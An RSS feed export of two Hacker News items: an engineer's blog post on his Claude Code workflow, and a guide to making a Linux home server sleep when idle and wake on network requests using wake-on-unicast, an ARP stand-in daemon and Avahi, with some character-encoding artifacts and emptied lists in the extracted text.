<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 03 Sep 2025 14:10:28 +0000</lastBuildDate><item><title>A staff engineer's journey with Claude Code</title><link>https://www.sanity.io/blog/first-attempt-will-be-95-garbage</link><description>&lt;doc fingerprint="16680613ea860e8a"&gt;
  &lt;main&gt;
    &lt;p&gt;This started as an internal Sanity workshop where I demoed how I actually use AI. Spoiler: it's running multiple agents like a small team with daily amnesia.&lt;/p&gt;
    &lt;p&gt;Vincent Quigley&lt;/p&gt;
    &lt;p&gt;Vincent Quigley is a Staff Software Engineer at Sanity&lt;/p&gt;
    &lt;p&gt;Published&lt;/p&gt;
    &lt;p&gt;Until 18 months ago, I wrote every line of code myself. Today, AI writes 80% of my initial implementations while I focus on architecture, review, and steering multiple development threads simultaneously.&lt;/p&gt;
    &lt;p&gt;This isn't another "AI will change everything" post. This is about the messy reality of integrating AI into production development workflows: what actually works, what wastes your time, and why treating AI like a "junior developer who doesn't learn" became my mental model for success.&lt;/p&gt;
    &lt;p&gt;The backstory: We run monthly engineering workshops at Sanity where someone presents what they've been experimenting with. Last time was my turn, and I showed how I'd been using Claude Code.&lt;/p&gt;
    &lt;p&gt;This blog post is from my presentation at our internal workshop (10-min recording below).&lt;/p&gt;
    &lt;p&gt;My approach to solving code problems has pivoted four times in my career:&lt;/p&gt;
    &lt;p&gt;For the first 5 years, I was reading books and SDK documentation.&lt;/p&gt;
    &lt;p&gt;Then 12 years of googling for crowd-sourced answers.&lt;/p&gt;
    &lt;p&gt;It was 18 months of using Cursor for AI-assisted coding&lt;/p&gt;
    &lt;p&gt;And recently, 6 weeks of using Claude Code for full AI delegation&lt;/p&gt;
    &lt;p&gt;Each transition happened faster than the last. The shift to Claude Code? That took just hours of use for me to become productive.&lt;/p&gt;
    &lt;p&gt;Here's what my workflow looks like now, stripped of the hype. I use AI mostly "to think with" as I'm working with it towards the code that ends up in production.&lt;/p&gt;
    &lt;p&gt;Forget the promise of one-shot perfect code generation. Your job as an engineer is to find the best solution for the problem, not just write a bunch of code.&lt;/p&gt;
    &lt;p&gt;Then you take the learnings from this attempt and feed it back.&lt;/p&gt;
    &lt;p&gt;This isn't failure; it's the process! Expecting perfection on attempt one is like expecting a junior developer to nail a complex feature without context.&lt;/p&gt;
    &lt;p&gt;The biggest challenge? AI can't retain learning between sessions (unless you spend the time manually giving it the "memories"). So typically, every conversation starts fresh.&lt;/p&gt;
    &lt;p&gt;My solutions:&lt;/p&gt;
    &lt;p&gt;Create a project-specific context file with:&lt;/p&gt;
    &lt;p&gt;Thanks to MCP integrations, I can now connect my AI to:&lt;/p&gt;
    &lt;p&gt;Without this context, you're explaining the same constraints repeatedly. With it, you start at attempt two instead of attempt one.&lt;/p&gt;
    &lt;p&gt;I run multiple Claude instances in parallel now, it's like managing a small team of developers who reset their memory each morning.&lt;/p&gt;
    &lt;p&gt;Key strategies:&lt;/p&gt;
    &lt;p&gt;Writing code is one part of the job, but so is reviewing code. Adopting AI has evolved my code review process as well.&lt;/p&gt;
    &lt;p&gt;This saves me and my peers time and extra rounds.&lt;/p&gt;
    &lt;p&gt;At Sanity, our policy is that the engineer is responsible for the code they ship, even if it's AI generated. I want to make sure that I ship:&lt;/p&gt;
    &lt;p&gt;The key take away: I'm more critical of "my code" now because I didn't type out a lot of it. No emotional attachment means better reviews.&lt;/p&gt;
    &lt;p&gt;We're testing Slack-triggered agents using Cursor for simple tasks:&lt;/p&gt;
    &lt;p&gt;Current limitations:&lt;/p&gt;
    &lt;p&gt;But the potential? Imagine agents handling your backlog's small tickets while you sleep. We're actively exploring this at Sanity, sharing learnings across teams as we figure out what works.&lt;/p&gt;
    &lt;p&gt;Let's talk money. My Claude Code usage costs my company not an insignificant percent of what they pay me monthly.&lt;/p&gt;
    &lt;p&gt;But for that investment:&lt;/p&gt;
    &lt;p&gt;The ROI is obvious, but budget for $1000-1500/month for a senior engineer going all-in on AI development. It's also reasonable to expect engineers to get more efficient with AI spend as they get good with it, but give them time.&lt;/p&gt;
    &lt;p&gt;Not everything in AI-assisted development is smooth. Here are the persistent challenges I find myself in:&lt;/p&gt;
    &lt;p&gt;The learning problem&lt;lb/&gt;AI doesn't learn from mistakes. You fix the same misunderstandings repeatedly. Your solution: better documentation and more explicit instructions.&lt;/p&gt;
    &lt;p&gt;The confidence problem&lt;lb/&gt;AI confidently writes broken code claiming that it's great. Always verify, especially for:&lt;/p&gt;
    &lt;p&gt;The context limit problem&lt;lb/&gt;Large codebases overwhelm AI context windows. Break problems into smaller chunks and provide focused context.&lt;/p&gt;
    &lt;p&gt;The hardest part? Letting go of code ownership. But now I don't care about "my code" anymore; it's just output to review and refine.&lt;/p&gt;
    &lt;p&gt;This detachment is actually quite liberating!&lt;/p&gt;
    &lt;p&gt;If a better AI tool appears tomorrow, I'll switch immediately. The code isn't precious; the problems we solve are.&lt;/p&gt;
    &lt;p&gt;If I were to give advice from an engineer's perspective, if you're a technical leader considering AI adoption:&lt;/p&gt;
    &lt;p&gt;The engineers who adapt to the new AI workflows will find themselves with a new sharp knife in their toolbox: They're becoming orchestrators, handling multiple AI agents while focusing on architecture, review, and complex problem-solving.&lt;/p&gt;
    &lt;p&gt;Pick one small, well-defined feature. Give AI three attempts at implementing it. Review the output like you're mentoring a junior developer.&lt;/p&gt;
    &lt;p&gt;That's it. No huge transformation needed, no process overhaul required. Just one feature, three attempts, and a honest review.&lt;/p&gt;
    &lt;p&gt;The future isn't about AI replacing developers. It's about developers working faster, creating better solutions, and leveraging the best tools available.&lt;/p&gt;
    &lt;p&gt;üëã Knut from the developer education team here: if you're curious why Sanity makes AI-assisted development particularly effective: it's all code-based configuration. Schemas, workflows, and even the editorial UI are defined in TypeScript, which means AI tools can actually understand and generate the entire stack. No clicking through web UIs to configure things. Here's a course on that specific workflow if you want to go deeper.&lt;/p&gt;
    &lt;p&gt;And back to our regular programming.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45107962</guid></item><item><title>Making a Linux home server sleep on idle and wake on demand (2023)</title><link>https://dgross.ca/blog/linux-home-server-auto-sleep</link><description>&lt;doc fingerprint="96f37d91e92280c3"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Making a Linux home server sleep on idle and wake on demand √¢ the simple way&lt;/head&gt;
    &lt;p&gt;It began with what seemed like a final mundane touch to my home server setup for hosting Time Machine backups: I wanted it to automatically sleep when idle and wake up again when needed. You know, sleep on idle √¢ hasn√¢t Windows had that built in since like Windows 98? How hard could it be to configure on a modern Ubuntu install?&lt;/p&gt;
    &lt;p&gt;To be fair, I wanted more than just sleep on idle, I also wanted wake on request √¢ and that second bit turns out to be the hard part. There were a bunch of dead ends, but I stuck out it to find something that √¢just works√¢ without the need to manually turn on the server for every backup. Join me on the full adventure further down, or cut to the chase with the setup instructions below.&lt;/p&gt;
    &lt;head rend="h1"&gt;tl;dr&lt;/head&gt;
    &lt;head rend="h4"&gt;Outcome:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Server automatically suspends to RAM when idle&lt;/item&gt;
      &lt;item&gt;Server automatically wakes when needed by anything else on the network, including SSH, Time Machine backups, etc.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;You√¢ll need:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;An always-on Linux device on the same network as your server, e.g. a Raspberry Pi&lt;/item&gt;
      &lt;item&gt;A network interface device for your server that supports wake-on-LAN with unicast packets&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;On the server:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Enable wake-on-LAN with unicast packets (not just magic packets), make it persistent&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;sudo ethtool -s eno1 wol ug
sudo tee /etc/networkd-dispatcher/configuring.d/wol &amp;lt;&amp;lt; EOF
#!/usr/bin/env bash

ethtool -s eno1 wol ug || true
EOF
sudo chmod 755 /etc/networkd-dispatcher/configuring.d/wol
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Set up a cron job to sleep on idle (replace &lt;code&gt;/home/ubuntu&lt;/code&gt;with your desired script location)&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;tee /home/ubuntu/auto-sleep.sh &amp;lt;&amp;lt; EOF
#!/bin/bash
logged_in_count=$(who | wc -l)
# We expect 2 lines of output from `lsof -i:548` at idle: one for output headers, another for the 
# server listening for connections. More than 2 lines indicates inbound connection(s).
afp_connection_count=$(lsof -i:548 | wc -l)
if [[ $logged_in_count &amp;lt; 1 &amp;amp;&amp;amp; $afp_connection_count &amp;lt; 3 ]]; then
  systemctl suspend
else
  echo "Not suspending, logged in users: $logged_in_count, connection count: $afp_connection_count"
fi
EOF
chmod +x /home/ubuntu/auto-sleep.sh
sudo crontab -e
# In the editor, add the following line:
*/10 * * * * /home/ubuntu/auto-sleep.sh | logger -t autosuspend
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Disable IPv6: this approach relies on ARP, which IPv6 doesn√¢t use&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;sudo nano /etc/default/grub
# Find GRUB_CMDLINE_LINUX=""
# Change to GRUB_CMDLINE_LINUX="ipv6.disable=1"
sudo update-grub
sudo reboot
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Optional: Configure network services (e.g. Netatalk) to stop before sleep to prevent unwanted wakeups due to network activity&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;sudo tee /etc/systemd/system/netatalk-sleep.service &amp;lt;&amp;lt; EOF
[Unit]
Description=Netatalk sleep hook
Before=sleep.target
StopWhenUnneeded=yes

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=-/usr/bin/systemctl stop netatalk
ExecStop=-/usr/bin/systemctl start netatalk

[Install]
WantedBy=sleep.target
EOF
sudo systemctl daemon-reload
sudo systemctl enable netatalk-sleep.service
&lt;/code&gt;
    &lt;head rend="h4"&gt;On the always-on device:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Install ARP Stand-in: a super simple Ruby script that runs as a system service and responds to ARP requests on behalf of another machine. Configure it to respond on behalf of the sleeping server.&lt;/item&gt;
      &lt;item&gt;Optional: Configure Avahi to advertise network services on behalf of the server when it√¢s sleeping.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;sudo apt install avahi-daemon
sudo tee /etc/systemd/system/avahi-publish.service &amp;lt;&amp;lt; EOF
[Unit]
Description=Publish custom Avahi records
After=network.target avahi-daemon.service
Requires=avahi-daemon.service

[Service]
ExecStart=/usr/bin/avahi-publish -s homeserver _afpovertcp._tcp 548 -H homeserver.local

[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload
sudo systemctl enable avahi-publish.service --now
systemctl status avahi-publish.service
&lt;/code&gt;
    &lt;head rend="h4"&gt;Caveats&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The server√¢s network device needs to support wake-on-LAN from unicast packets&lt;/item&gt;
      &lt;item&gt;To prevent unwanted wake-ups, you√¢ll need to ensure no device on the network is sending extraneous packets to the server&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;How I got there&lt;/head&gt;
    &lt;p&gt;First, a bit about my hardware, as this solution is somewhat hardware-dependent:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;HP ProDesk 600 G3 SFF&lt;/item&gt;
      &lt;item&gt;CPU: Intel Core i5-7500&lt;/item&gt;
      &lt;item&gt;Network adapter: Intel I219-LM&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Sleeping on idle&lt;/head&gt;
    &lt;p&gt;I started with sleep-on-idle, which boiled down to two questions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;How to determine if the server is idle or busy at any given moment&lt;/item&gt;
      &lt;item&gt;How to automatically suspend to RAM after being idle for some time&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Most of the guides I found for sleep-on-idle, like this one, were for Ubuntu Desktop √¢ sleep-on-idle doesn√¢t seem to be something that√¢s commonly done with Ubuntu Server. I came across a few tools that looked promising, the most notable being &lt;code&gt;circadian&lt;/code&gt;. In general, though, there didn√¢t seem to be a standard/best-practice way to do it, so I decided I√¢d roll it myself the simplest way I could.&lt;/p&gt;
    &lt;head rend="h3"&gt;Determining idle/busy state&lt;/head&gt;
    &lt;p&gt;I asked myself what server activity would constitute being busy, and landed on two things:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Logged in SSH sessions&lt;/item&gt;
      &lt;item&gt;In-progress Time Machine backups&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Choosing corresponding metrics was pretty straightforward:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Count of logged in users, using &lt;code&gt;who&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Count of connections on the AFP port (548), using &lt;code&gt;lsof&lt;/code&gt;(I√¢m using AFP for Time Machine network shares)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For both metrics, I noted the values first at idle, and then again when the server was busy.&lt;/p&gt;
    &lt;head rend="h3"&gt;Automatically suspending to RAM&lt;/head&gt;
    &lt;p&gt;To keep things simple, I opted for a cron job that triggers a bash script √¢ check out the final version shared above. So far it√¢s worked fine; if I ever need to account for more metrics in detecting idle state, I√¢ll consider using a more sophisticated option like &lt;code&gt;circadian&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;Waking on request&lt;/head&gt;
    &lt;p&gt;With sleep-on-idle out of the way, I moved on to figuring out how the server would wake on demand.&lt;/p&gt;
    &lt;p&gt;Could the machine be configured to automatically wake upon receiving a network request? I knew Wake-on-LAN supported waking a computer up using a specially crafted √¢magic packet√¢, and it was straightforward to get this working. The question was if a regular, non-√¢magic packet√¢ could somehow do the same thing.&lt;/p&gt;
    &lt;head rend="h3"&gt;Wake on PHY?&lt;/head&gt;
    &lt;p&gt;Some online searching yielded a superuser discussion that looked particularly promising. It pointed to the man page for ethtool, the Linux utility used to configure network hardware. It shared ethtool√¢s complete wake-on-LAN configuration options:&lt;/p&gt;
    &lt;code&gt;wol p|u|m|b|a|g|s|f|d...
      Sets Wake-on-LAN options.  Not all devices support
      this.  The argument to this option is a string of
      characters specifying which options to enable.

      p   Wake on PHY activity
      u   Wake on unicast messages
      m   Wake on multicast messages
      b   Wake on broadcast messages
      a   Wake on ARP
      g   Wake on MagicPacket√¢¬¢
      s   Enable SecureOn√¢¬¢ password for MagicPacket√¢¬¢
      f   Wake on filter(s)
      d   Disable (wake on nothing).  This option
          clears all previous options.
&lt;/code&gt;
    &lt;p&gt;It pointed in particular to the &lt;code&gt;Wake on PHY activity&lt;/code&gt; option, which seemed perfect for this use-case. It seemed to mean that any packet sent to the network interface√¢s MAC address would wake it. I enabled the flag using &lt;code&gt;ethtool&lt;/code&gt;, manually put the machine to sleep, then tried logging back in using SSH and sending pings. No dice: the machine remained asleep despite multiple attempts. So much for that √∞&lt;/p&gt;
    &lt;head rend="h3"&gt;Breakthrough: wake on unicast&lt;/head&gt;
    &lt;p&gt;None of &lt;code&gt;ethtool&lt;/code&gt;√¢s other wake-on-LAN options seemed relevant, but some more searching pointed to the &lt;code&gt;Wake on unicast messages&lt;/code&gt; as another option to try. I enabled the flag using &lt;code&gt;ethtool&lt;/code&gt;, manually put the machine to sleep, then tried logging back in using SSH. Bingo! This time, the machine woke up. √∞ With that, I figured I was done.&lt;/p&gt;
    &lt;p&gt;Not so fast √¢ there were two problems:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Sometimes, the server would wake up without any network activity that I knew of&lt;/item&gt;
      &lt;item&gt;Some period of time after the server went to sleep, it would become impossible to wake it again using network activity other than a magic packet&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;A closer look at the same superuser discussion above revealed exactly the reason for the second problem: shortly after going to sleep, the machine was effectively disappearing from the network because it was no longer responding to ARP requests.&lt;/p&gt;
    &lt;head rend="h3"&gt;ARP&lt;/head&gt;
    &lt;p&gt;So the cached ARP entry for other machines on the network was expiring, meaning that they had no way to resolve the server√¢s IP address to its MAC address. In other words, an attempt to ping my server at &lt;code&gt;192.168.1.2&lt;/code&gt; was failing to even send a packet to the server, because the server√¢s MAC address wasn√¢t known. Without a packet being sent, there was no way that server was going to wake up.&lt;/p&gt;
    &lt;head rend="h4"&gt;Static ARP?&lt;/head&gt;
    &lt;p&gt;My first reaction: let√¢s manually create ARP cache entries on each network client. This is indeed possible on macOS using:&lt;/p&gt;
    &lt;code&gt;sudo arp -s [IP address] [MAC address]
&lt;/code&gt;
    &lt;p&gt;But it also didn√¢t meet the goal of having things √¢just work√¢: I was not interested in creating static ARP cache entries on each machine that would be accessing the server. On to other options.&lt;/p&gt;
    &lt;head rend="h4"&gt;ARP protocol offload?&lt;/head&gt;
    &lt;p&gt;Some more searching revealed something interesting: this problem had already been solved long ago in the Windows world.&lt;/p&gt;
    &lt;p&gt;It was called ARP protocol offload, and it goes like this:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The network hardware is capable of responding to ARP requests independently of the CPU&lt;/item&gt;
      &lt;item&gt;Before going to sleep, the OS configures the network hardware to respond to ARP requests&lt;/item&gt;
      &lt;item&gt;While sleeping, the network hardware responds to ARP requests on its own, without waking the rest of the machine to use the CPU&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Voila, this was exactly what I needed. I even looked at the datasheet for my network hardware, which lists ARP Offload as a feature on the front page.&lt;/p&gt;
    &lt;p&gt;The only problem? No Linux support. I searched the far reaches of the internet, then finally dug into the Linux driver source code to find that ARP offload isn√¢t supported by the Linux driver. This was when I briefly pondered trying to patch the driver to add ARP offload√¢¬¶ before reminding myself that successfully patching Linux driver code is far beyond what I could hope to achieve in a little free-time project like this one. (Though maybe one day√¢¬¶)&lt;/p&gt;
    &lt;head rend="h4"&gt;Other solutions using magic packets&lt;/head&gt;
    &lt;p&gt;Some more searching led me to some other clever and elaborate solutions involving magic packets. The basic idea was to automate sending magic packets. One solution (wake-on-arp) listens for ARP requests to a specified host to trigger sending a magic packet to that host. Another solution implements a web interface and Home Assistant integration to enable triggering a magic packet from a smartphone web browser. These are impressive, but I wanted something simpler that didn√¢t require manually waking up the server.&lt;/p&gt;
    &lt;p&gt;I considered a few other options, but abandoned them because they felt too complex and prone to breaking:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Writing a script to send a magic packet and then immediately trigger a Time Machine backup using &lt;code&gt;tmutil&lt;/code&gt;. The script would need to be manually installed and scheduled to run periodically on each Mac.&lt;/item&gt;
      &lt;item&gt;Using HAProxy to proxy all relevant network traffic through the Raspberry Pi and using a hook to send a magic packet to the server on activity.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Breakthrough: ARP Stand-in&lt;/head&gt;
    &lt;p&gt;What I was attempting didn√¢t seem much different from the static IP mapping that√¢s routinely configured on home routers, except that it was for DHCP instead of ARP. Was there no way to make my router do the same thing for ARP?&lt;/p&gt;
    &lt;p&gt;Some more digging into the ARP protocol revealed that ARP resolution doesn√¢t even require a specific, authoritative host to answer requests √¢ any other network device can respond to ARP requests. In other words, my router didn√¢t need to be the one resolving ARP requests, it could be anything. Now how could I just set up something to respond on behalf of the sleeping server?&lt;/p&gt;
    &lt;p&gt;Here√¢s what I was trying to do:&lt;/p&gt;
    &lt;p&gt;I thought it must be possible to implement as a Linux network configuration, but the closest thing I found was Proxy ARP, which accomplished a different goal. So I went one level deeper, to network programming.&lt;/p&gt;
    &lt;p&gt;Now, how to go about listening for ARP request packets? This is apparently possible to do using a raw socket, but I also knew that &lt;code&gt;tcpdump&lt;/code&gt; and Wireshark were capable of using filters to capture only packets of a given type. That led me to look into libpcap, the library that powers both of those tools. I learned that using &lt;code&gt;libpcap&lt;/code&gt; had a clear advantage over a raw socket: &lt;code&gt;libpcap&lt;/code&gt; implements very efficient filtering directly in the kernel, whereas a raw socket would require manual packet filtering in user space, which is less performant.&lt;/p&gt;
    &lt;p&gt;Aiming to keep things simple, I decided to try writing the solution in Ruby, which led me to the pcaprub Ruby bindings for &lt;code&gt;libpcap&lt;/code&gt;. From there, I just needed to figure out what filter to use with &lt;code&gt;libpcap&lt;/code&gt;. Some research and trial/error yielded this filter:&lt;/p&gt;
    &lt;code&gt;arp and arp[6:2] == 1 and arp[24:4] == [IP address converted to hex]
&lt;/code&gt;
    &lt;p&gt;For example, using a target IP address of &lt;code&gt;192.168.1.2&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;arp and arp[6:2] == 1 and arp[24:4] == 0xc0a80102
&lt;/code&gt;
    &lt;p&gt;Let√¢s break this down, using the ARP packet structure definition for byte offets and lengths:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;arp&lt;/code&gt;√¢ ARP packets&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;arp[6:2] == 1&lt;/code&gt;√¢ ARP request packets.&lt;code&gt;[6:2]&lt;/code&gt;means √¢the 2 bytes found at byte offset 6√¢.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;arp[24:4] == [IP address converted to hex]&lt;/code&gt;√¢ ARP packets with the specified target address.&lt;code&gt;[24:4]&lt;/code&gt;means √¢the 4 bytes found at byte offset 24√¢.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The rest is pretty straightforward and the whole solution comes out to only ~50 lines of Ruby code. In short, &lt;code&gt;arp_standin&lt;/code&gt; is a daemon that does the following:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Starts up, taking these configuration options: &lt;list rend="ul"&gt;&lt;item&gt;IP and MAC address of the machine it√¢s standing in for (the √¢target√¢)&lt;/item&gt;&lt;item&gt;Network interface to operate on&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Listens for ARP requests for the target√¢s IP address&lt;/item&gt;
      &lt;item&gt;On detecting an ARP request for the target√¢s IP address, responds with the target√¢s MAC address&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Since the server√¢s IP √¢ MAC address mapping is defined statically through the &lt;code&gt;arp_standin&lt;/code&gt; daemon√¢s configuration, it doesn√¢t matter if the Raspberry Pi√¢s ARP cache entry for the server is expired.&lt;/p&gt;
    &lt;p&gt;Check out the link below to install it or explore the source code further:&lt;/p&gt;
    &lt;p&gt;danielpgross/arp_standin on GitHub&lt;/p&gt;
    &lt;p&gt;ARP is used in IPv4 and is replaced by Neighbor Discovery Protocol (NDP) in IPv6. I don√¢t have any need for IPv6 right now, so I disabled IPv6 entirely on the server using the steps shown above. It should be possible to add support for Neighbor Discovery to the ARP-Standin service as a future enhancement.&lt;/p&gt;
    &lt;p&gt;With the new service running on my Raspberry Pi, I used Wireshark to confirm that ARP requests being sent to the server were triggering responses from the ARP Stand-in. It worked √∞ √¢ things were looking promising.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting it all working&lt;/head&gt;
    &lt;p&gt;The big pieces were in place:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;the server went to sleep after becoming idle&lt;/item&gt;
      &lt;item&gt;the server could wake up from unicast packets&lt;/item&gt;
      &lt;item&gt;other machines could resolve the server√¢s MAC address using ARP, long after it went to sleep&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;With the ARP Stand-in running, I turned on the server and ran a backup from my computer. When the backup was finished, the server went to sleep automatically. But there was a problem: the server was waking up immediately after going to sleep.&lt;/p&gt;
    &lt;head rend="h3"&gt;Unwanted wake-ups&lt;/head&gt;
    &lt;p&gt;First thing I checked was the Linux system logs, but these didn√¢t prove too helpful, since they didn√¢t show what network packet actually triggered the wakeup. Wireshark/tcpdump were no help here either, because they wouldn√¢t be running when the computer was sleeping. That√¢s when I thought to use port mirroring: capturing packets from an intermediary device between the server and the rest of the network. After a brief, unsuccessful attempt to repurpose an extra router running OpenWRT, a search for the least expensive network switch with port mirroring support yielded the TP-Link TL-SG105E for ~$30.&lt;/p&gt;
    &lt;p&gt;With the switch connected and port mirroring enabled, I started capturing with Wireshark and the culprits immediately became clear:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;My Mac, which was configured to use the server as a Time Machine backup host using AFP, was sending AFP packets to the server after it had gone to sleep&lt;/item&gt;
      &lt;item&gt;My Netgear R7000, acting as a wireless access point, was sending frequent, unsolicited NetBIOS &lt;code&gt;NBTSTAT&lt;/code&gt;queries to the server&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Eliminating AFP packets&lt;/head&gt;
    &lt;p&gt;I had a hunch about why the Mac was sending these packets:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The Mac mounted the AFP share to perform a Time Machine backup&lt;/item&gt;
      &lt;item&gt;The Time Machine backup finished, but the share remained mounted&lt;/item&gt;
      &lt;item&gt;The Mac was checking on the status of the share periodically, as would be done normally for a mounted network share&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I also had a corresponding hunch that the solution would be to make sure the share got unmounted before the server went to sleep, so that the Mac would no longer ping the server for its status afterwards. I figured that shutting down the AFP service would trigger unmounting of shares on all its clients, achieving the goal. Now I just needed to ensure the service would shut down when the server was going to sleep, then start again when it woke back up.&lt;/p&gt;
    &lt;p&gt;Fortunately, &lt;code&gt;systemd&lt;/code&gt; supports exactly that, and relatively easily √¢ I defined a dedicated &lt;code&gt;systemd&lt;/code&gt; service to hook into sleep/wake events (check out the configuration shared above). A Wireshark capture confirmed that it did the trick.&lt;/p&gt;
    &lt;head rend="h4"&gt;Eliminating NetBIOS packets&lt;/head&gt;
    &lt;p&gt;This one proved to be harder, because the packets were unsolicited √¢ they seemed random and unrelated to any activity being done by the server. I thought they might be related to Samba services running on the server, but the packets persisted even after I completely removed Samba from the server.&lt;/p&gt;
    &lt;p&gt;Why was my network router sending NetBIOS requests, anyway? Turns out that Netgear routers have a feature called ReadySHARE for sharing USB devices over the network using the SMB protocol. Presumably, the router firmware uses Samba behind the scenes, which uses NetBIOS queries to build and maintain its own representation of NetBIOS hosts on the network. Easy √¢ turn off ReadySHARE, right? Nope, there√¢s no way to do that in Netgear√¢s stock firmware √∞.&lt;/p&gt;
    &lt;p&gt;That led me to take the plunge and flash the router with open-source FreshTomato firmware. I√¢m glad I did, because the firmware is much better than the stock one anyway, and it immediately stopped the unwanted NetBIOS packets.&lt;/p&gt;
    &lt;head rend="h3"&gt;Time Machine not triggering wake-up&lt;/head&gt;
    &lt;p&gt;I was getting close now: the server remained asleep, and I could reliably wake it up by logging in with SSH, even long after it went to sleep.&lt;/p&gt;
    &lt;p&gt;This was great, but one thing wasn√¢t working: when starting a backup on my Mac, Time Machine would show a loading state indefinitely with &lt;code&gt;Connecting to backup disk...&lt;/code&gt; and eventually give up. Was the server failing to wake up from packets the Mac was sending, or was the Mac not sending packets at all?&lt;/p&gt;
    &lt;p&gt;A port-mirrored Wireshark capture answered that question: the Mac wasn√¢t sending any packets to the server, even long after it started to say &lt;code&gt;Connecting to backup disk...&lt;/code&gt;. Digging into the macOS Time Machine logs with:&lt;/p&gt;
    &lt;code&gt;log show --style syslog --predicate 'senderImagePath contains[cd] "TimeMachine"' --info
&lt;/code&gt;
    &lt;p&gt;A few entries made it clear:&lt;/p&gt;
    &lt;code&gt;(TimeMachine) [com.apple.TimeMachine:Mounting] Attempting to mount 'afp://backup_mbp@homeserver._afpovertcp._tcp.local./tm_mbp'
...
(TimeMachine) [com.apple.TimeMachine:General] Failed to resolve CFNetServiceRef with name = homeserver type = _afpovertcp._tcp. domain = local.
&lt;/code&gt;
    &lt;p&gt;The Mac was using mDNS (a.k.a. Bonjour, Zeroconf) to resolve the backup server√¢s IP address using its hostname. The server was asleep and therefore not responding to the requests, so the Mac was failing to resolve its IP address. This explained why the Mac wasn√¢t sending any packets to the server, leaving it asleep.&lt;/p&gt;
    &lt;head rend="h4"&gt;mDNS stand-in&lt;/head&gt;
    &lt;p&gt;I already had an ARP stand-in service, now I needed my Raspberry Pi to also respond to mDNS queries for the server while it slept. I knew that Avahi was one of the main mDNS implementations for Linux. I first tried these instructions using &lt;code&gt;.service&lt;/code&gt; files to configure my Raspberry Pi to respond to mDNS queries on behalf of the server. I used the following on the Mac to check the result:&lt;/p&gt;
    &lt;code&gt;dns-sd -L homeserver _afpovertcp._tcp local
&lt;/code&gt;
    &lt;p&gt;For some reason, that approach just didn√¢t work; Avahi didn√¢t respond on behalf of the server. I experimented instead with &lt;code&gt;avahi-publish&lt;/code&gt; (man page), which (to my pleasant surprise) worked right away using the following:&lt;/p&gt;
    &lt;code&gt;avahi-publish -s homeserver _afpovertcp._tcp 548 -H homeserver.local
&lt;/code&gt;
    &lt;p&gt;With that, I just needed to create a &lt;code&gt;systemd&lt;/code&gt; service definition that would automatically run the &lt;code&gt;avahi-publish&lt;/code&gt; command on boot (check out the configuration shared above).&lt;/p&gt;
    &lt;head rend="h2"&gt;√∞ Finish&lt;/head&gt;
